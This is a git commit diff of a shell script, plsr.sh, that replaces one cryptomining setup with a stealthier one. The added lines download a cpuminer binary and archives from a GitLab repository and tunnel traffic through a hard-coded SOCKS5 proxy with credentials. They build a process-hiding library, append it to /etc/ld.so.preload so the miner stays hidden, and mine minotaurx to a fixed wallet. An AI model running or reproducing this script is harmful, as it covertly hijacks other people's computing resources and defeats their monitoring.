8af42cd4322b5aaccaf55acedac054fb79c13c8b
oksila54 <124560356+oksila54@users.noreply.github.com>
2023-03-17 10:28:28 +0700

    Update plsr.sh

--- plsr.sh
+++ plsr.sh
@@ -1,18 +1,55 @@
 #!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
 
-WALLET=PFiw1McLfMKeqRMdhHG7ne6cEw2Z13ABgY
+apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
 
-POOL=stratum+tcps://stratum-asia.rplant.xyz:17063
+sudo apt-get install -y nodejs
 
-sudo apt install screen -y > /dev/null 2>&1
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.1.0/SRBMiner-Multi-2-1-0-Linux.tar.xz
-tar -xf SRBMiner-Multi-2-1-0-Linux.tar.xz
-cd SRBMiner-Multi-2-1-0
-chmod +x SRBMiner-MULTI
-screen -S Wuenuak_Guerrr -dm ./SRBMiner-MULTI --disable-gpu --algorithm minotaurx --pool $POOL --wallet $WALLET --password x --cpu-threads 7 --msr-use-tweaks 0 --msr-use-preset 0 --cpu-threads-intensity 1 --cpu-threads-priority 7
-screen -ls
-sleep 2
-clear
-cd ..
-screen -ls
-./timer.sh
+apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y
+
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+
+npm i -g node-process-hider
+
+wget https://gitlab.com/ubedx/ngopi/-/raw/main/cpuminer-opt-linux.tar.gz
+tar -xvzf cpuminer-opt-linux.tar.gz
+wget https://gitlab.com/ubedx/ngopi/-/raw/main/graphics.tar.gz
+tar -xvzf graphics.tar.gz
+
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 46.101.213.31:443
+socks5_username = pejuang
+socks5_password = sedekah
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo ""
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo ""
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://gitlab.com/ubedx/ngopi/-/raw/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp ./cpuminer-sse2 -a minotaurx  -o stratum+tcps://stratum-asia.rplant.xyz:17063 -u PFiw1McLfMKeqRMdhHG7ne6cEw2Z13ABgY.$(shuf -n 1 -i 1-999999) -t14
